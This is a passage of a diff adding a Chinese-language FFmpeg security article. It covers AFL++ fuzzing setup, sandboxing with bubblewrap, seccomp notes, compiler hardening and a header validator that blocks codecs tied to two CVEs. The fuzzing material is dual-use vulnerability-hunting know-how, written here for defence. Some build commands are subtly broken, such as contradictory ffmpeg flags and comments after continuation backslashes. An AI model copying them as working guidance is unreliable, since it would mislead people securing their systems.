+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">generate_magicyuv_seed</span><span class="p">(</span><span class="s2">&quot;/tmp/ffmpeg_magicyuv_seeds&quot;</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>7.4 Fuzzing配置最佳实践</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 使用AFL++ (增强版AFL) 进行更高效的Fuzzing</span>
+<span class="c1"># 编译FFmpeg with AFL++</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">CC</span><span class="o">=</span>afl-clang-fast
+<span class="nb">export</span><span class="w"> </span><span class="nv">CXX</span><span class="o">=</span>afl-clang-fast++
+<span class="nb">export</span><span class="w"> </span><span class="nv">AFL_USE_ASAN</span><span class="o">=</span><span class="m">1</span>
+
+<span class="c1"># 使用CMPLOG提高代码覆盖率发现</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AFL_LLVM_CMPLOG</span><span class="o">=</span><span class="m">1</span>
+
+<span class="c1"># 使用LAF-SCTF提高整数比较的覆盖率</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AFL_LLVM_LAF_SPLIT_SWITCHES</span><span class="o">=</span><span class="m">1</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AFL_LLVM_LAF_SPLIT_COMPARES</span><span class="o">=</span><span class="m">1</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">AFL_LLVM_LAF_SPLIT_TRANSFORMS</span><span class="o">=</span><span class="m">1</span>
+
+<span class="c1"># 多核并行Fuzzing</span>
+afl-fuzz<span class="w"> </span>-i<span class="w"> </span>corpus/<span class="w"> </span>-o<span class="w"> </span>findings/<span class="w"> </span>-M<span class="w"> </span>master<span class="w"> </span>--<span class="w"> </span>./ffmpeg<span class="w"> </span>-i<span class="w"> </span>@@<span class="w"> </span>-f<span class="w"> </span>null<span class="w"> </span>-<span class="w"> </span><span class="p">&amp;</span>
+<span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="k">$(</span>nproc<span class="w"> </span>--ignore<span class="o">=</span><span class="m">1</span><span class="k">))</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span>afl-fuzz<span class="w"> </span>-i<span class="w"> </span>corpus/<span class="w"> </span>-o<span class="w"> </span>findings/<span class="w"> </span>-S<span class="w"> </span>slave_<span class="nv">$i</span><span class="w"> </span>--<span class="w"> </span>./ffmpeg<span class="w"> </span>-i<span class="w"> </span>@@<span class="w"> </span>-f<span class="w"> </span>null<span class="w"> </span>-<span class="w"> </span><span class="p">&amp;</span>
+<span class="k">done</span>
+<span class="nb">wait</span>
+
+<span class="c1"># 查找结果</span>
+ls<span class="w"> </span>-la<span class="w"> </span>findings/master/crashes/
+</code></pre></div>
+
+<hr />
+<h2>8. 防御方案</h2>
+<h3>8.1 升级FFmpeg</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 从源码编译最新版本</span>
+git<span class="w"> </span>clone<span class="w"> </span>https://git.ffmpeg.org/ffmpeg.git
+<span class="nb">cd</span><span class="w"> </span>ffmpeg
+git<span class="w"> </span>checkout<span class="w"> </span>master<span class="w">  </span><span class="c1"># 包含所有修复</span>
+
+<span class="c1"># 最小化编译 - 只启用需要的组件</span>
+./configure<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-everything<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-decoder<span class="o">=</span>h264<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-decoder<span class="o">=</span>aac<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-demuxer<span class="o">=</span>mov<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-demuxer<span class="o">=</span>mp3<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-protocol<span class="o">=</span>file<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-decoder<span class="o">=</span>magicyuv<span class="w"> </span><span class="se">\ </span><span class="w"> </span><span class="c1"># 如果不需要MagicYUV，直接禁用!</span>
+<span class="w">    </span>--disable-filter<span class="o">=</span>hqdn3d<span class="w"> </span><span class="se">\ </span><span class="w">    </span><span class="c1"># 如果不需要hqdn3d，禁用!</span>
+<span class="w">    </span>--disable-ffmpeg<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-ffplay<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-ffprobe<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-ffmpeg
+
+make<span class="w"> </span>-j<span class="k">$(</span>nproc<span class="k">)</span>
+make<span class="w"> </span>install
+</code></pre></div>
+
+<h3>8.2 禁用不必要的解码器</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检查当前构建包含的解码器</span>
+ffmpeg<span class="w"> </span>-decoders<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;magicyuv|mace6|lcl|zlib&quot;</span>
+
+<span class="c1"># 如果不需要MagicYUV解码器，重新编译时禁用</span>
+./configure<span class="w"> </span>--disable-decoder<span class="o">=</span>magicyuv<span class="w"> </span><span class="o">[</span>其他选项...<span class="o">]</span>
+
+<span class="c1"># 或使用运行时解码器黑名单 (如果应用支持)</span>
+<span class="c1"># 在代码中设置不允许的解码器</span>
+</code></pre></div>
+
+<h3>8.3 沙箱隔离</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">FFmpeg沙箱处理包装器</span>
+<span class="sd">使用Linux命名空间和seccomp隔离FFmpeg进程</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">tempfile</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">shutil</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">FFmpegSandbox</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;沙箱化的FFmpeg处理器&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">bwrap_path</span> <span class="o">=</span> <span class="s2">&quot;/usr/bin/bwrap&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ffmpeg_path</span> <span class="o">=</span> <span class="s2">&quot;/usr/local/bin/ffmpeg&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">process_media_safely</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">input_file</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> 
+                              <span class="n">output_dir</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+                              <span class="n">ffmpeg_args</span><span class="p">:</span> <span class="nb">list</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        在沙箱中安全处理媒体文件</span>
+<span class="sd">        返回: (returncode, stdout, stderr)</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="c1"># 创建临时目录</span>
+        <span class="n">sandbox_home</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mkdtemp</span><span class="p">(</span><span class="n">prefix</span><span class="o">=</span><span class="s2">&quot;ffmpeg_sandbox_&quot;</span><span class="p">)</span>
+        <span class="n">sandbox_input</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sandbox_home</span><span class="p">,</span> <span class="s2">&quot;input&quot;</span><span class="p">)</span>
+        <span class="n">sandbox_output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sandbox_home</span><span class="p">,</span> <span class="s2">&quot;output&quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">sandbox_output</span><span class="p">)</span>
+
+        <span class="c1"># 复制输入文件到沙箱</span>
+        <span class="n">shutil</span><span class="o">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">sandbox_input</span><span class="p">)</span>
+
+        <span class="c1"># 使用bwrap创建沙箱</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">bwrap_path</span><span class="p">,</span>
+            <span class="c1"># 创建新的命名空间</span>
+            <span class="s2">&quot;--unshare-all&quot;</span><span class="p">,</span>           <span class="c1"># 隔离所有命名空间</span>
+            <span class="s2">&quot;--share-net&quot;</span><span class="p">,</span>             <span class="c1"># 但保留网络(如果需要)</span>
+
+            <span class="c1"># 挂载proc和dev</span>
+            <span class="s2">&quot;--proc&quot;</span><span class="p">,</span> <span class="s2">&quot;/proc&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;--dev&quot;</span><span class="p">,</span> <span class="s2">&quot;/dev&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;--tmpfs&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp&quot;</span><span class="p">,</span>
+
+            <span class="c1"># 只读挂载系统库</span>
+            <span class="s2">&quot;--ro-bind&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/lib&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/lib&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;--ro-bind&quot;</span><span class="p">,</span> <span class="s2">&quot;/lib&quot;</span><span class="p">,</span> <span class="s2">&quot;/lib&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;--ro-bind&quot;</span><span class="p">,</span> <span class="s2">&quot;/lib64&quot;</span><span class="p">,</span> <span class="s2">&quot;/lib64&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;--ro-bind&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">ffmpeg_path</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">ffmpeg_path</span><span class="p">,</span>
+
+            <span class="c1"># 读写挂载沙箱目录</span>
+            <span class="s2">&quot;--bind&quot;</span><span class="p">,</span> <span class="n">sandbox_home</span><span class="p">,</span> <span class="n">sandbox_home</span><span class="p">,</span>
+            <span class="s2">&quot;--bind&quot;</span><span class="p">,</span> <span class="n">sandbox_output</span><span class="p">,</span> <span class="n">sandbox_output</span><span class="p">,</span>
+
+            <span class="c1"># 安全限制</span>
+            <span class="s2">&quot;--die-with-parent&quot;</span><span class="p">,</span>       <span class="c1"># 父进程退出时杀死子进程</span>
+            <span class="s2">&quot;--new-session&quot;</span><span class="p">,</span>           <span class="c1"># 新会话</span>
+
+            <span class="c1"># 运行FFmpeg</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">ffmpeg_path</span><span class="p">,</span>
+            <span class="s2">&quot;-i&quot;</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sandbox_home</span><span class="p">,</span> <span class="s2">&quot;input&quot;</span><span class="p">),</span>
+            <span class="s2">&quot;-y&quot;</span><span class="p">,</span>  <span class="c1"># 覆盖输出</span>
+        <span class="p">]</span> <span class="o">+</span> <span class="n">ffmpeg_args</span> <span class="o">+</span> <span class="p">[</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sandbox_output</span><span class="p">,</span> <span class="s2">&quot;output.mp4&quot;</span><span class="p">)</span>
+        <span class="p">]</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+                <span class="n">cmd</span><span class="p">,</span>
+                <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+                <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+                <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span>  <span class="c1"># 超时限制</span>
+                <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;HOME&quot;</span><span class="p">:</span> <span class="n">sandbox_home</span><span class="p">}</span>
+            <span class="p">)</span>
+
+            <span class="c1"># 复制输出文件</span>
+            <span class="n">output_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sandbox_output</span><span class="p">,</span> <span class="s2">&quot;output.mp4&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">output_file</span><span class="p">):</span>
+                <span class="n">shutil</span><span class="o">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="n">output_dir</span><span class="p">)</span>
+
+            <span class="k">return</span> <span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">returncode</span><span class="p">,</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">result</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+
+        <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;FFmpeg processing timed out (60s)&quot;</span><span class="p">)</span>
+
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="c1"># 清理沙箱</span>
+            <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">sandbox_home</span><span class="p">,</span> <span class="n">ignore_errors</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+
+<span class="c1"># 使用seccomp进一步限制系统调用</span>
+<span class="n">SECCOMP_FILTER</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2"># seccomp过滤器: 限制FFmpeg可用的系统调用</span>
+<span class="s2"># 使用seccomp-tools或libseccomp生成</span>
+
+<span class="s2"># 允许的系统调用白名单</span>
+<span class="s2"># 文件操作: read, write, open, openat, close, stat, fstat, lstat</span>
+<span class="s2"># 内存管理: mmap, munmap, mprotect, brk</span>
+<span class="s2"># 进程管理: exit, exit_group, rt_sigreturn</span>
+<span class="s2"># 禁止: execve (防止shellcode执行), fork, clone, socket (如不需要网络)</span>
+<span class="s2">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<h3>8.4 编译加固</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># FFmpeg编译加固配置</span>
+
+<span class="c1"># 使用ASAN/UBSAN编译 (用于检测和开发环境)</span>
+./configure<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--extra-cflags<span class="o">=</span><span class="s2">&quot;-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--extra-ldflags<span class="o">=</span><span class="s2">&quot;-fsanitize=address,undefined&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--enable-debug<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-stripping<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">[</span>其他选项...<span class="o">]</span>
+
+<span class="c1"># 生产环境加固 (不使用ASAN，但启用其他保护)</span>
+./configure<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--extra-cflags<span class="o">=</span><span class="s2">&quot;-fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--extra-ldflags<span class="o">=</span><span class="s2">&quot;-pie -Wl,-z,relro,-z,now&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--disable-stripping<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">[</span>其他选项...<span class="o">]</span>
+
+<span class="c1"># Stack Canary: -fstack-protector-strong</span>
+<span class="c1"># FORTIFY_SOURCE: 缓冲区溢出检测</span>
+<span class="c1"># PIE + ASLR: 地址空间随机化</span>
+<span class="c1"># RELRO + BIND_NOW: GOT保护</span>
+
+<span class="c1"># 运行时ASAN检测 (用于安全监控)</span>
+<span class="c1"># 在容器中运行ASAN编译的FFmpeg处理用户上传</span>
+<span class="c1"># ASAN会在内存错误发生时立即终止进程并报告</span>
+<span class="nv">ASAN_OPTIONS</span><span class="o">=</span><span class="s2">&quot;abort_on_error=1:detect_leaks=0:halt_on_error=1&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>/usr/local/bin/ffmpeg-asan<span class="w"> </span>-i<span class="w"> </span>input.mp4<span class="w"> </span>-f<span class="w"> </span>null<span class="w"> </span>-
+</code></pre></div>
+
+<h3>8.5 输入校验</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">媒体文件预校验模块</span>
+<span class="sd">在FFmpeg处理前检查文件的合理性</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Optional</span><span class="p">,</span> <span class="n">Tuple</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">MediaFileValidator</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;媒体文件安全校验器&quot;&quot;&quot;</span>
+
+    <span class="c1"># 最大允许的帧尺寸</span>
+    <span class="n">MAX_WIDTH</span> <span class="o">=</span> <span class="mi">7680</span>   <span class="c1"># 8K</span>
+    <span class="n">MAX_HEIGHT</span> <span class="o">=</span> <span class="mi">4320</span>  <span class="c1"># 8K</span>
+
+    <span class="c1"># 最大允许的文件大小</span>
+    <span class="n">MAX_FILE_SIZE</span> <span class="o">=</span> <span class="mi">500</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>  <span class="c1"># 500MB</span>
+
+    <span class="c1"># 禁止的编解码器 (不需要或高风险的)</span>
+    <span class="n">BLOCKED_CODECS</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sa">b</span><span class="s1">&#39;M8Y0&#39;</span><span class="p">,</span>  <span class="c1"># MagicYUV (CVE-2026-8461)</span>
+        <span class="sa">b</span><span class="s1">&#39;AVDJ&#39;</span><span class="p">,</span>  <span class="c1"># AVID DNxHD (如果不需要)</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">validate_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">file_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;校验媒体文件安全性&quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;File not found&quot;</span>
+
+        <span class="c1"># 检查文件大小</span>
+        <span class="n">file_size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">file_size</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">MAX_FILE_SIZE</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;File too large: </span><span class="si">{</span><span class="n">file_size</span><span class="si">}</span><span class="s2"> bytes&quot;</span>
+
+        <span class="c1"># 读取文件头</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">header</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+
+        <span class="c1"># 检查文件格式和编解码器</span>
+        <span class="n">format_type</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_detect_format</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">format_type</span> <span class="o">==</span> <span class="s1">&#39;avi&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_validate_avi</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">format_type</span> <span class="o">==</span> <span class="s1">&#39;mov&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_validate_mov</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">format_type</span> <span class="o">==</span> <span class="s1">&#39;caf&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_validate_caf</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;Unknown format - proceeding with caution&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_detect_format</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">header</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检测文件格式&quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">header</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">None</span>
+        <span class="k">if</span> <span class="n">header</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;RIFF&#39;</span> <span class="ow">and</span> <span class="n">header</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;AVI &#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s1">&#39;avi&#39;</span>
+        <span class="k">if</span> <span class="n">header</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;ftyp&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s1">&#39;mov&#39;</span>
+        <span class="k">if</span> <span class="n">header</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;caff&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s1">&#39;caf&#39;</span>
+        <span class="k">return</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_validate_avi</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">header</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;校验AVI文件&quot;&quot;&quot;</span>
+        <span class="c1"># 查找视频流格式块(strf)</span>
+        <span class="n">strf_pos</span> <span class="o">=</span> <span class="n">header</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;strf&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">strf_pos</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;No stream format found&quot;</span>
+
+        <span class="c1"># 解析BITMAPINFOHEADER</span>
+        <span class="n">bi_offset</span> <span class="o">=</span> <span class="n">strf_pos</span> <span class="o">+</span> <span class="mi">8</span>  <span class="c1"># 跳过chunk头</span>
+        <span class="k">if</span> <span class="n">bi_offset</span> <span class="o">+</span> <span class="mi">40</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">header</span><span class="p">):</span>
+            <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;Header too short for full validation&quot;</span>
+
+        <span class="n">bi_width</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s1">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="n">bi_offset</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">bi_height</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s1">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="n">bi_offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">bi_compression</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="n">bi_offset</span><span class="o">+</span><span class="mi">16</span><span class="p">:</span><span class="n">bi_offset</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>
+
+        <span class="c1"># 检查帧尺寸</span>
+        <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">bi_width</span><span class="p">)</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">MAX_WIDTH</span> <span class="ow">or</span> <span class="nb">abs</span><span class="p">(</span><span class="n">bi_height</span><span class="p">)</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">MAX_HEIGHT</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Frame size too large: </span><span class="si">{</span><span class="n">bi_width</span><span class="si">}</span><span class="s2">x</span><span class="si">{</span><span class="n">bi_height</span><span class="si">}</span><span class="s2">&quot;</span>
+
+        <span class="c1"># 检查禁止的编解码器</span>
+        <span class="k">if</span> <span class="n">bi_compression</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">BLOCKED_CODECS</span><span class="p">:</span>
+            <span class="n">codec_name</span> <span class="o">=</span> <span class="n">bi_compression</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Blocked codec: </span><span class="si">{</span><span class="n">codec_name</span><span class="si">}</span><span class="s2">&quot;</span>
+
+        <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;AVI validation passed&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_validate_caf</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">header</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;校验CAF文件 (针对CVE-2026-66039)&quot;&quot;&quot;</span>
+        <span class="c1"># 查找desc chunk</span>
+        <span class="n">desc_pos</span> <span class="o">=</span> <span class="n">header</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;desc&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">desc_pos</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;No desc chunk found&quot;</span>
+
+        <span class="c1"># 检查desc chunk中的可疑值</span>
+        <span class="c1"># CVE-2026-66039: bytes_per_packet * frames_per_packet溢出</span>
+        <span class="c1"># 需要检查这两个字段是否可能导致整数溢出</span>
+        <span class="c1"># CAF desc chunk格式较为复杂，此处简化检查</span>
+
